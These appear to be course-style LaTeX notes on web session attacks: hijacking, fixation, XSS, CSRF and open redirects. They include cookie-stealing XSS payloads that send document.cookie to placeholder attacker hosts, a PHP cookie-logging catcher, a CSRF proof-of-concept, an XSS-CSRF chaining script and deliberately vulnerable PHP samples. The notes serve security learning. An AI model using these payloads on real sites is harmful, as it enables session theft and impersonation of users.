\chapter{Session security}
\section{Introduction}
\subsection{Session Identifier Security}

A unique session identifier (Session ID) or token is the basis upon which user
sessions are generated and distinguished.

We should clarify that if an attacker obtains a session identifier, this can
result in session hijacking, where the attacker can essentially impersonate the
victim in the web application.

An attacker can obtain a session identifier through a multitude of techniques,
not all of which include actively attacking the victim. A session identifier
can also be:
\begin{itemize}
    \item  Captured through passive traffic/packet sniffing
    \item  Identified in logs
    \item  Predicted
    \item  Brute Forced
\end{itemize}


A session identifier's security level depends on its:

\begin{itemize}
    \item  {\bf Validity Scope} (a secure session identifier should be valid for one
      session only)
  \item  {\bf Randomness} (a secure session identifier should be generated through a
      robust random number/string generation algorithm so that it cannot be
  predicted)
  \item  {\bf Validity Time} (a secure session identifier should expire after a
      certain amount of time)
\end{itemize}


A session identifier's security level also depends on the location where it is stored:
\begin{itemize}
   \item {\bf URL}: If this is the case, the HTTP Referer header can leak a
       session identifier to other websites. In addition, browser history will
       also contain any session identifier stored in the URL.
   \item {\bf HTML}: If this is the case, the session identifier can be
       identified in both the browser's cache memory and any intermediate
       proxies
   \item {\bf sessionStorage}: SessionStorage is a browser storage feature
       introduced in HTML5. Session identifiers stored in sessionStorage can be
       retrieved as long as the tab or the browser is open. In other words,
       sessionStorage data gets cleared when the page session ends. Note that a
       page session survives over page reloads and restores.
   \item {\bf localStorage}: LocalStorage is a browser storage feature
       introduced in HTML5. Session identifiers stored in localStorage can be
       retrieved as long as localStorage does not get deleted by the user. This
       is because data stored within localStorage will not be deleted when the
       browser process is terminated, with the exception of "private browsing"
       or "incognito" sessions where data stored within localStorage are
       deleted by the time the last tab is closed.
\end{itemize}

Session identifiers that are managed with no server interference or that do not
follow the secure "characteristics" above should be reported as weak.

\subsection{Session Attacks}

The main types of session attacks are:

\begin{itemize}
    \item {\bf Session Hijackingi}: the attacker takes advantage of insecure
        session identifiers, finds a way to obtain them, and uses them to
        authenticate to the server and impersonate the victim.

    \item {\bf Session Fixation}: occurs when an attacker can fixate a (valid)
        session identifier he will then have to trick the victim into logging
        into the application using the aforementioned session identifier. If
        the victim does so, the attacker can proceed to a Session Hijacking
        attack (since the session identifier is already known).

    \item {\bf XSS (Cross-Site Scripting)}, with a focus on user sessions

    \item {\bf CSRF (Cross-Site Request Forgery)}: forces an end-user to
        execute inadvertent actions on a web application in which they are
        currently authenticated. This attack is usually mounted with the help
        of attacker-crafted web pages that the victim must visit or interact
        with. These web pages contain malicious requests that essentially
        inherit the identity and privileges of the victim to perform an
        undesired function on the victim's behalf.

    \item {\bf Open Redirects} with a focus on user sessions: An Open Redirect
        vulnerability occurs when an attacker can redirect a victim to an
        attacker-controlled site by abusing a legitimate application's
        redirection functionality. In such cases, all the attacker has to do is
        specify a website under their control in a redirection URL of a
        legitimate website and pass this URL to the victim. As you can imagine,
        this is possible when the legitimate application's redirection
        functionality does not perform any kind of validation regarding the
        websites which the redirection points to.
\end{itemize}

\section{Session Hijacking}

\section{Session fixation}
Session Fixation occurs when an attacker can fixate a (valid) session
identifier. As you can imagine, the attacker will then have to trick the victim
into logging into the application using the aforementioned session identifier.
If the victim does so, the attacker can proceed to a Session Hijacking attack
(since the session identifier is already known).

Such bugs usually occur when session identifiers (such as cookies) are being
accepted from URL Query Strings or Post Data (more on that in a bit).

Session Fixation attacks are usually mounted in three stages:
\begin{enumerate}
        \item Attacker manages to obtain a valid session identifier:
            Authenticating to an application is not always a requirement to get
            a valid session identifier, and a large number of applications
            assign valid session identifiers to anyone who browses them. This
            also means that an attacker can be assigned a valid session
            identifier without having to authenticate. Note: An attacker can
            also obtain a valid session identifier by creating an account on
            the targeted application (if this is a possibility).


        \item Attacker manages to fixate a valid session identifier: The above
            is expected behavior, but it can turn into a session fixation
            vulnerability if:
            \begin{itemize}
                    \item The assigned session identifier pre-login remains the same post-login and
                    \item Session identifiers (such as cookies) are being
                        accepted from URL Query Strings or Post Data and
                        propagated to the application
            \end{itemize}
            If, for example, a session-related parameter is included in the URL
            (and not on the cookie header) and any specified value eventually
            becomes a session identifier, then the attacker can fixate a
            session.
        \item Attacker tricks the victim into establishing a session using the
            abovementioned session identifier: All the attacker has to do is
            craft a URL and lure the victim into visiting it. If the victim
            does so, the web application will then assign this session
            identifier to the victim.
\end{enumerate}

example of vulnerable application :
\begin{verbatim}
<?php
    if (!isset($_GET["token"])) {
        session_start();
        header("Location: /?redirect_uri=/complete.html&token=" . session_id());
    } else {
        setcookie("PHPSESSID", $_GET["token"]);
    }
?>
\end{verbatim}

 If the token parameter is already set (else statement), set PHPSESSID to the
 value of the token parameter. Any URL in the following format
 \verb+http://XX/?redirect_uri=/complete.html&token=SpecifiedCookieValue+

 will update PHPSESSID's value with the token parameter's value.

\section{Without user interactions}

\begin{itemize}
    \item sniffing with wireshark
    \item Web-server post exploit
        \begin{itemize}
            \item php: \verb+session.save_path+ in \verb+PHP.ini+
            \item tomacat
                \href{http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html}{see
                here}
            \item \verb+.Net+
                \href{https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/}{Introduction
                To ASP.NET Sessions}
        \end{itemize}
    \item in sql db
\end{itemize}

\chapter{Cross-Site Scripting (XSS)}
For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:
\begin{itemize}
    \item Session cookies should be carried in all HTTP requests
    \item Session cookies should be accessible by JavaScript code (the
        \verb+HTTPOnly+ attribute should be missing)
\end{itemize}

\begin{verbatim}
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
\end{verbatim}

Catcher:
\begin{verbatim}
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
\end{verbatim}


A sample HTTPS>HTTPS payload example:

\begin{verbatim}
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
\end{verbatim}


\section{Cross-Site Request Forgery (CSRF or XSRF)}
Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an end-user
to execute inadvertent actions on a web application in which they are currently
authenticated. This attack is usually mounted with the help of attacker-crafted
web pages that the victim must visit or interact with, leveraging the lack of
anti-CSRF security mechanisms. These web pages contain malicious requests that
essentially inherit the identity and privileges of the victim to perform an
undesired function on the victim's behalf. CSRF attacks generally target
functions that cause a state change on the server but can also be used to
access sensitive data.


During CSRF attacks, the attacker does not need to read the server's response
to the malicious cross-site request. This means that
\href{https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy}{Same-Origin
Policy} cannot be considered a security mechanism against CSRF attacks.

web application is vulnerable to CSRF attacks when:
\begin{itemize}
    \item All the parameters required for the targeted request can be determined or guessed by the attacker
    \item The application's session management is solely based on HTTP cookies, which are automatically included in browser requests
\end{itemize}

To successfully exploit a CSRF vulnerability, we need:
\begin{itemize}
    \item To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
    \item The victim to be logged into the application at the time when the malicious cross-site request is issued
\end{itemize}


\begin{verbatim}
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
\end{verbatim}


\section{XSS and CSRF Chaining}

\begin{verbatim}
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>

\end{verbatim}


\section{Weak CSRF token}

When assessing how robust a CSRF token generation mechanism is, make sure you
spend a small amount of time trying to come up with the CSRF token generation
mechanism. It can be as easy as \verb+md5(username)+, \verb+sha1(username)+, 
\verb-md5(current date + username)- etc. Please note that you should not spend
much time on this, but it is worth a shot.

\section{Additional CSRF Protection Bypasses}

\begin{itemize}
    \item null value
    \item random value
    \item use another session csrf token
    \item request method tampering
    \item delete the csrf token parameter and send a blank token
    \item csrf fixation
\end{itemize}

If  Referrer header is used  try  \verb+<meta name="referrer" content="no-referrer" />+
ometimes the Referrer has a whitelist regex or a regex that allows one specific
domain. 



\section{Open Redirect}

An Open Redirect vulnerability occurs when an attacker can redirect a victim to
an attacker-controlled site by abusing a legitimate application's redirection
functionality. In such cases, all the attacker has to do is specify a website
under their control in a redirection URL of a legitimate website and pass this
URL to the victim. As you can imagine, this is possible when the legitimate
application's redirection functionality does not perform any kind of validation
regarding the websites to which the redirection points. From an attacker's
perspective, an open redirect vulnerability can prove extremely useful during
the initial access phase since it can lead victims to attacker-controlled web
pages through a page that they trust.


\begin{verbatim}
$red = $_GET['url'];
header("Location: " . $red);
\end{verbatim}

Make sure you check for the following URL parameters when bug hunting, you'll
often see them in login pages. Example: \verb+/login.php?redirect=dashboard+


